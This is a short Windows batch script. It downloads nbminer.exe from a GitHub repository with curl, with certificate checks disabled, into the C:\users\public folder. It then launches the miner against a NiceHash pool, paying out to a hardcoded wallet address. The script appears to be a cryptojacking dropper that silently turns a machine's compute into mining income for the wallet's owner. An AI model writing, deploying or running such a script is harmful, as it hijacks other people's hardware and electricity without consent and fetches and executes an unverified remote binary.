@echo off
cd C:\users\public\
curl -LJOk "https://github.com/zortos293/CloudForceFiles/raw/main/nbminer.exe" 
start "" "nbminer.exe" -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 35YDSvNdKVCmA2RRQd2fpYQBqhN1SsyqUZ.Zortosuwu
